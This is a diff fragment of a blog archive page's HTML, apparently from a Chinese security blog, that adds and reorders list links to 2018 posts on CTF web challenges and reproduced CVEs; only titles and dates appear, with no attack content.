             <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2018/07/30/ISITDTU-CTF-Web/" >ISITDTU CTF-Web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2018/07/26/MeePwn-Web-复现/" >MeePwn-Web-复现</a>
         </li>
     
     
@@ -3231,12 +3189,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/有点意思的3道web题/" >有点意思的3道web题</a>
+            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/最近复现的几个CVE题目/" >最近复现的几个CVE题目</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/最近复现的几个CVE题目/" >最近复现的几个CVE题目</a>
+            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/有点意思的3道web题/" >有点意思的3道web题</a>
         </li>
     
     
